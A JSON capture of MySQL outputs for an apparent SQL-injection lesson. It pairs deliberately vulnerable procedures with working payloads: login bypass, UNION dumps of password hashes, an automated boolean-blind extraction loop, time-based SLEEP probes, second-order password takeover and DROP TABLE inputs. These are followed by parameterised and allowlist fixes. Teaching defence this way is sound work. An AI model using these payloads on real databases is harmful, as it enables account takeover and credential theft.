@@ -1,0 +1,801 @@
+{
+ "doc": "m11-sql-injection",
+ "meta": {
+  "mysqlVersion": "8.0.46-0ubuntu0.24.04.4",
+  "capturedAt": "2026-11-09"
+ },
+ "blocks": {
+  "s1:1f96c174b1e0": {
+   "statements": [
+    {
+     "sql": "CREATE TABLE app_users (\n  user_id       INT PRIMARY KEY AUTO_INCREMENT,\n  username      VARCHAR(40) NOT NULL UNIQUE,\n  password_hash CHAR(64)    NOT NULL,\n  is_admin      BOOLEAN     NOT NULL DEFAULT FALSE\n)",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "INSERT INTO app_users (username, password_hash, is_admin) VALUES\n  ('admin', SHA2('correct horse battery', 256), TRUE),\n  ('maria', SHA2('maria-pass-2024', 256),       FALSE),\n  ('dev',   SHA2('dev-pass', 256),              FALSE)",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 3,
+     "info": "Records: 3  Duplicates: 0  Warnings: 0",
+     "rows": []
+    },
+    {
+     "sql": "SELECT user_id, username, is_admin FROM app_users ORDER BY user_id",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 3,
+     "rows": [
+      [
+       1,
+       "admin",
+       1
+      ],
+      [
+       2,
+       "maria",
+       0
+      ],
+      [
+       3,
+       "dev",
+       0
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s2:c5dd97231a36": {
+   "statements": [
+    {
+     "sql": "CREATE PROCEDURE login_unsafe(IN p_user VARCHAR(200), IN p_pass VARCHAR(200))\nBEGIN\n  SET @sql = CONCAT('SELECT user_id, username, is_admin FROM app_users WHERE username = ''', p_user,\n                    ''' AND password_hash = SHA2(''', p_pass, ''', 256)');\n  PREPARE stmt FROM @sql;\n  EXECUTE stmt;\n  DEALLOCATE PREPARE stmt;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL login_unsafe('maria', 'maria-pass-2024')",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 1,
+     "affected_rows": 0,
+     "rows": [
+      [
+       2,
+       "maria",
+       0
+      ]
+     ]
+    },
+    {
+     "sql": "CALL login_unsafe('maria', 'wrong password')",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 0,
+     "affected_rows": 0,
+     "rows": []
+    }
+   ],
+   "measured": null
+  },
+  "s3:b4afb776a077": {
+   "statements": [
+    {
+     "sql": "CALL login_unsafe('admin'' -- ', 'anything at all')",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 1,
+     "affected_rows": 0,
+     "rows": [
+      [
+       1,
+       "admin",
+       1
+      ]
+     ]
+    },
+    {
+     "sql": "SELECT @sql AS statement_the_server_parsed",
+     "status": "ok",
+     "columns": [
+      "statement_the_server_parsed"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       "SELECT user_id, username, is_admin FROM app_users WHERE username = 'admin' -- ' AND password_hash = SHA2('anything at all', 256)"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s4:5ed6f885a78b": {
+   "statements": [
+    {
+     "sql": "CREATE PROCEDURE login_safe(IN p_user VARCHAR(200), IN p_pass VARCHAR(200))\nBEGIN\n  PREPARE stmt FROM\n    'SELECT user_id, username, is_admin FROM app_users WHERE username = ? AND password_hash = SHA2(?, 256)';\n  SET @u = p_user, @p = p_pass;\n  EXECUTE stmt USING @u, @p;\n  DEALLOCATE PREPARE stmt;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL login_safe('admin'' -- ', 'anything at all')",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 0,
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL login_safe('maria', 'maria-pass-2024')",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 1,
+     "affected_rows": 0,
+     "rows": [
+      [
+       2,
+       "maria",
+       0
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s5:8d183dd350ba": {
+   "statements": [
+    {
+     "sql": "CREATE PROCEDURE order_lookup_unsafe(IN p_order_id VARCHAR(200))\nBEGIN\n  SET @sql = CONCAT('SELECT order_id, customer_id, status FROM orders WHERE order_id = ', p_order_id);\n  PREPARE stmt FROM @sql;\n  EXECUTE stmt;\n  DEALLOCATE PREPARE stmt;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL order_lookup_unsafe('11')",
+     "status": "ok",
+     "columns": [
+      "order_id",
+      "customer_id",
+      "status"
+     ],
+     "row_count": 1,
+     "affected_rows": 0,
+     "rows": [
+      [
+       11,
+       9,
+       "paid"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s6:463a0017af56": {
+   "statements": [
+    {
+     "sql": "CALL order_lookup_unsafe(\n  '0 UNION SELECT ORDINAL_POSITION, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ''app_users''')",
+     "status": "ok",
+     "columns": [
+      "order_id",
+      "customer_id",
+      "status"
+     ],
+     "row_count": 4,
+     "affected_rows": 0,
+     "rows": [
+      [
+       1,
+       "app_users",
+       "user_id"
+      ],
+      [
+       2,
+       "app_users",
+       "username"
+      ],
+      [
+       3,
+       "app_users",
+       "password_hash"
+      ],
+      [
+       4,
+       "app_users",
+       "is_admin"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s7:8a184ecbd60c": {
+   "statements": [
+    {
+     "sql": "CALL order_lookup_unsafe('0 UNION SELECT user_id, username, password_hash FROM app_users')",
+     "status": "ok",
+     "columns": [
+      "order_id",
+      "customer_id",
+      "status"
+     ],
+     "row_count": 3,
+     "affected_rows": 0,
+     "rows": [
+      [
+       1,
+       "admin",
+       "9028ea0d15decaa35b2da21c0290af3b1a5ba0a30a591906f89b5074e209ea72"
+      ],
+      [
+       2,
+       "maria",
+       "d9fd39fc28c45c382a251f54dc88ec6fd0a38835d253138a3595fca4c4eb99f4"
+      ],
+      [
+       3,
+       "dev",
+       "f460882c1ac44587ae8140787fa47b2c865c1a6d71bdcbf194651fa0aa90b878"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s8:61ad08ee8a01": {
+   "statements": [
+    {
+     "sql": "CREATE PROCEDURE email_exists_unsafe(IN p_email VARCHAR(300), OUT p_found BOOLEAN)\nBEGIN\n  SET @sql = CONCAT('SELECT COUNT(*) > 0 INTO @found FROM customers WHERE email = ''', p_email, '''');\n  PREPARE stmt FROM @sql;\n  EXECUTE stmt;\n  DEALLOCATE PREPARE stmt;\n  SET p_found = @found;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL email_exists_unsafe('nobody@example.com', @f1)",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL email_exists_unsafe(\n  'nobody@example.com'' OR SUBSTRING((SELECT password_hash FROM app_users WHERE username = ''admin''), 1, 1) = ''9',\n  @f2)",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL email_exists_unsafe(\n  'nobody@example.com'' OR SUBSTRING((SELECT password_hash FROM app_users WHERE username = ''admin''), 1, 1) = ''8',\n  @f3)",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "SELECT @f1 AS plain_answer, @f2 AS first_char_is_9, @f3 AS first_char_is_8",
+     "status": "ok",
+     "columns": [
+      "plain_answer",
+      "first_char_is_9",
+      "first_char_is_8"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       0,
+       1,
+       0
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s9:e761e7ce70f6": {
+   "statements": [
+    {
+     "sql": "CREATE PROCEDURE blind_extract(IN p_len INT)\nBEGIN\n  DECLARE pos INT DEFAULT 1;\n  DECLARE k INT;\n  DECLARE ch CHAR(1);\n  DECLARE found BOOLEAN;\n  SET @recovered = '', @requests = 0;\n  WHILE pos <= p_len DO\n    SET k = 1;\n    probe: WHILE k <= 16 DO\n      SET ch = SUBSTRING('0123456789abcdef', k, 1);\n      CALL email_exists_unsafe(\n        CONCAT('nobody@example.com'' OR SUBSTRING((SELECT password_hash FROM app_users WHERE username = ''admin''), ',\n               pos, ', 1) = ''', ch),\n        found);\n      SET @requests = @requests + 1;\n      IF found THEN\n        SET @recovered = CONCAT(@recovered, ch);\n        LEAVE probe;\n      END IF;\n      SET k = k + 1;\n    END WHILE;\n    SET pos = pos + 1;\n  END WHILE;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL blind_extract(8)",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "SELECT @recovered AS recovered_by_attacker, @requests AS requests_sent,\n       (SELECT LEFT(password_hash, 8) FROM app_users WHERE username = 'admin') AS actual_prefix",
+     "status": "ok",
+     "columns": [
+      "recovered_by_attacker",
+      "requests_sent",
+      "actual_prefix"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       "9028ea0d",
+       64,
+       "9028ea0d"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s10:256004bb4f2b": {
+   "statements": [
+    {
+     "sql": "CREATE TABLE search_log (id INT AUTO_INCREMENT PRIMARY KEY, term VARCHAR(200))",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CREATE PROCEDURE log_search_unsafe(IN p_term VARCHAR(400))\nBEGIN\n  SET @sql = CONCAT('INSERT INTO search_log (term) VALUES (''', p_term, ''')');\n  PREPARE stmt FROM @sql;\n  EXECUTE stmt;\n  DEALLOCATE PREPARE stmt;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL log_search_unsafe('blue jeans')",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    }
+   ],
+   "measured": null
+  },
+  "s11:86c463850efc": {
+   "statements": [
+    {
+     "sql": "CALL log_search_unsafe('x''), (IF(SUBSTRING((SELECT password_hash FROM app_users WHERE username = ''admin''), 1, 1) = ''9'', SLEEP(0.5), ''n'')) -- ')",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": [],
+     "elapsed_ms": 502.67
+    },
+    {
+     "sql": "CALL log_search_unsafe('x''), (IF(SUBSTRING((SELECT password_hash FROM app_users WHERE username = ''admin''), 1, 1) = ''8'', SLEEP(0.5), ''n'')) -- ')",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": [],
+     "elapsed_ms": 2.19
+    }
+   ],
+   "measured": true
+  },
+  "s12:c818d8828d09": {
+   "statements": [
+    {
+     "sql": "SELECT id, term FROM search_log ORDER BY id",
+     "status": "ok",
+     "columns": [
+      "id",
+      "term"
+     ],
+     "row_count": 5,
+     "rows": [
+      [
+       1,
+       "blue jeans"
+      ],
+      [
+       2,
+       "x"
+      ],
+      [
+       3,
+       "0"
+      ],
+      [
+       4,
+       "x"
+      ],
+      [
+       5,
+       "n"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s13:c494613031fe": {
+   "statements": [
+    {
+     "sql": "CREATE PROCEDURE register_user(IN p_user VARCHAR(40), IN p_pass VARCHAR(200))\nBEGIN\n  INSERT INTO app_users (username, password_hash) VALUES (p_user, SHA2(p_pass, 256));\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CREATE PROCEDURE change_password_unsafe(IN p_user_id INT, IN p_new VARCHAR(200))\nBEGIN\n  DECLARE v_name VARCHAR(40);\n  SELECT username INTO v_name FROM app_users WHERE user_id = p_user_id;\n  SET @sql = CONCAT('UPDATE app_users SET password_hash = SHA2(''', p_new,\n                    ''', 256) WHERE username = ''', v_name, '''');\n  PREPARE stmt FROM @sql;\n  EXECUTE stmt;\n  DEALLOCATE PREPARE stmt;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL register_user('admin'' -- ', 'whatever')",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 1,
+     "rows": []
+    },
+    {
+     "sql": "SELECT user_id, username FROM app_users ORDER BY user_id",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username"
+     ],
+     "row_count": 4,
+     "rows": [
+      [
+       1,
+       "admin"
+      ],
+      [
+       2,
+       "maria"
+      ],
+      [
+       3,
+       "dev"
+      ],
+      [
+       4,
+       "admin' -- "
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s14:13eeb35608f4": {
+   "statements": [
+    {
+     "sql": "CALL change_password_unsafe(4, 'attacker-chosen')",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "SELECT @sql AS executed_statement",
+     "status": "ok",
+     "columns": [
+      "executed_statement"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       "UPDATE app_users SET password_hash = SHA2('attacker-chosen', 256) WHERE username = 'admin' -- '"
+      ]
+     ]
+    },
+    {
+     "sql": "SELECT username, password_hash = SHA2('attacker-chosen', 256) AS has_attacker_password\nFROM app_users ORDER BY user_id",
+     "status": "ok",
+     "columns": [
+      "username",
+      "has_attacker_password"
+     ],
+     "row_count": 4,
+     "rows": [
+      [
+       "admin",
+       1
+      ],
+      [
+       "maria",
+       0
+      ],
+      [
+       "dev",
+       0
+      ],
+      [
+       "admin' -- ",
+       0
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "w1.0:ff7847d831da": {
+   "statements": [
+    {
+     "sql": "SELECT CONCAT('SELECT user_id, username, is_admin FROM app_users WHERE username = ''', 'admin'' -- ',\n              ''' AND password_hash = SHA2(''', 'anything', ''', 256)') AS statement_text",
+     "status": "ok",
+     "columns": [
+      "statement_text"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       "SELECT user_id, username, is_admin FROM app_users WHERE username = 'admin' -- ' AND password_hash = SHA2('anything', 256)"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "w1.2:62dc38df70a5": {
+   "statements": [
+    {
+     "sql": "SELECT user_id, username, is_admin FROM app_users WHERE username = 'admin'",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       1,
+       "admin",
+       1
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "w1.3:973e6017b994": {
+   "statements": [
+    {
+     "sql": "SET @u = 'admin'' -- ', @p = 'anything'",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "PREPARE s FROM 'SELECT user_id, username, is_admin FROM app_users WHERE username = ? AND password_hash = SHA2(?, 256)'",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "info": "Statement prepared",
+     "rows": []
+    },
+    {
+     "sql": "EXECUTE s USING @u, @p",
+     "status": "ok",
+     "columns": [
+      "user_id",
+      "username",
+      "is_admin"
+     ],
+     "row_count": 0,
+     "rows": []
+    },
+    {
+     "sql": "DEALLOCATE PREPARE s",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    }
+   ],
+   "measured": null
+  },
+  "s15:1719b17332ea": {
+   "statements": [
+    {
+     "sql": "CREATE PROCEDURE products_sorted(IN p_sort VARCHAR(40))\nBEGIN\n  DECLARE v_order_by VARCHAR(60);\n  SET v_order_by = CASE p_sort\n                     WHEN 'price_asc'  THEN '`price` ASC, `product_id`'\n                     WHEN 'price_desc' THEN '`price` DESC, `product_id`'\n                     WHEN 'name'       THEN '`name`, `product_id`'\n                     ELSE NULL\n                   END;\n  IF v_order_by IS NULL THEN\n    SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Unsupported sort option';\n  END IF;\n  SET @sql = CONCAT('SELECT product_id, name, price FROM products ORDER BY ', v_order_by, ' LIMIT 3');\n  PREPARE stmt FROM @sql;\n  EXECUTE stmt;\n  DEALLOCATE PREPARE stmt;\nEND",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "CALL products_sorted('price_desc')",
+     "status": "ok",
+     "columns": [
+      "product_id",
+      "name",
+      "price"
+     ],
+     "row_count": 3,
+     "affected_rows": 0,
+     "rows": [
+      [
+       3,
+       "Gaming Laptop 16",
+       "1799.00"
+      ],
+      [
+       1,
+       "Ultrabook 14 Pro",
+       "1299.00"
+      ],
+      [
+       2,
+       "Ultrabook 13 Air",
+       "999.00"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s16:4824584c5558": {
+   "statements": [
+    {
+     "sql": "CALL products_sorted('price; DROP TABLE orders')",
+     "status": "error",
+     "columns": [],
+     "rows": [],
+     "error": {
+      "code": 1644,
+      "message": "Unsupported sort option"
+     }
+    }
+   ],
+   "measured": null
+  },
+  "s17:f5cfaa07d136": {
+   "statements": [
+    {
+     "sql": "SET @term = '%'",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "PREPARE s FROM 'SELECT COUNT(*) AS matches FROM customers WHERE email LIKE CONCAT(''%'', ?, ''%'')'",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "info": "Statement prepared",
+     "rows": []
+    },
+    {
+     "sql": "EXECUTE s USING @term",
+     "status": "ok",
+     "columns": [
+      "matches"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       25
+      ]
+     ]
+    },
+    {
+     "sql": "SET @escaped = REPLACE(REPLACE(REPLACE(@term, '\\\\', '\\\\\\\\'), '%', '\\\\%'), '_', '\\\\_')",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "EXECUTE s USING @escaped",
+     "status": "ok",
+     "columns": [
+      "matches"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       0
+      ]
+     ]
+    },
+    {
+     "sql": "DEALLOCATE PREPARE s",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    }
+   ],
+   "measured": null
+  },
+  "s18:8ccab02c042e": {
+   "statements": [
+    {
+     "sql": "SELECT STATEMENT_DIGEST_TEXT('SELECT order_id FROM orders WHERE order_id = 11') AS normal_shape,\n       STATEMENT_DIGEST_TEXT('SELECT order_id FROM orders WHERE order_id = 0 UNION SELECT user_id FROM app_users') AS injected_shape",
+     "status": "ok",
+     "columns": [
+      "normal_shape",
+      "injected_shape"
+     ],
+     "row_count": 1,
+     "rows": [
+      [
+       "SELECT `order_id` FROM `orders` WHERE `order_id` = ?",
+       "SELECT `order_id` FROM `orders` WHERE `order_id` = ? UNION SELECT `user_id` FROM `app_users`"
+      ]
+     ]
+    }
+   ],
+   "measured": null
+  },
+  "s19:08f523be1cd0": {
+   "statements": [
+    {
+     "sql": "PREPARE s FROM 'SELECT COUNT(*) FROM ?'",
+     "status": "error",
+     "columns": [],
+     "rows": [],
+     "error": {
+      "code": 1064,
+      "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?' at line 1"
+     }
+    }
+   ],
+   "measured": null
+  },
+  "s20:8399111c82f3": {
+   "statements": [
+    {
+     "sql": "SET @q = 'SELECT 1; DROP TABLE app_users'",
+     "status": "ok",
+     "columns": [],
+     "affected_rows": 0,
+     "rows": []
+    },
+    {
+     "sql": "PREPARE s FROM @q",
+     "status": "error",
+     "columns": [],
+     "rows": [],
+     "error": {
+      "code": 1064,
+      "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE app_users' at line 1"
+     }
+    }
+   ],
+   "measured": null
+  }
+ }
+}
